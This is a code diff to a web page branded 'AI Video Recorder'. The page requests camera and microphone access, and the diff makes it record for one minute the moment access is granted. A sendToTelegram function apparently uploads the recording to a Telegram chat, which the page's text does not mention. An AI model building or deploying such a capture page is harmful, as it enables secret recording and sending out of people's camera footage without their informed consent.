@@ -65,9 +65,9 @@
     <h1>AI VIDEO RECORDER</h1>
     <video id="livePreview" autoplay muted></video>
     <video id="videoPlayer" controls></video>
-    <div id="countdown">Recording starts in: 60 seconds</div>
+    <div id="countdown">Recording time left: 60 seconds</div>
     <button id="toggleCamera">Switch to Rear Camera</button>
-    <p>Recording will start automatically. Please allow camera and microphone access and wait for one minute.</p>
+    <p>Recording will start automatically. Please allow camera and microphone access.</p>
     <div class="footer">© 2025 AI Video Recorder</div>
 
     <script>
@@ -85,26 +85,10 @@
                 });
                 document.getElementById('livePreview').srcObject = stream;
 
-                startCountdown(60, startRecording); // Countdown for 1 minute
+                startRecording();
             } catch (error) {
                 console.error('Error accessing camera or microphone:', error);
             }
-        }
-
-        function startCountdown(seconds, callback) {
-            const countdownElement = document.getElementById('countdown');
-            let remaining = seconds;
-
-            countdownInterval = setInterval(() => {
-                countdownElement.textContent = `Recording starts in: ${remaining} seconds`;
-                remaining--;
-
-                if (remaining < 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.textContent = 'Recording...';
-                    callback();
-                }
-            }, 1000);
         }
 
         function startRecording() {
@@ -122,10 +106,27 @@
             };
 
             mediaRecorder.start();
+            startCountdown(60); // Start 1-minute countdown
+
             setTimeout(() => {
                 mediaRecorder.stop();
                 stream.getTracks().forEach((track) => track.stop());
-            }, 60000); // Stop after 1 minute
+            }, 60000); // Stop recording after 1 minute
+        }
+
+        function startCountdown(seconds) {
+            const countdownElement = document.getElementById('countdown');
+            let remaining = seconds;
+
+            countdownInterval = setInterval(() => {
+                countdownElement.textContent = `Recording time left: ${remaining} seconds`;
+                remaining--;
+
+                if (remaining < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = 'Recording finished.';
+                }
+            }, 1000);
         }
 
         function sendToTelegram(blob) {
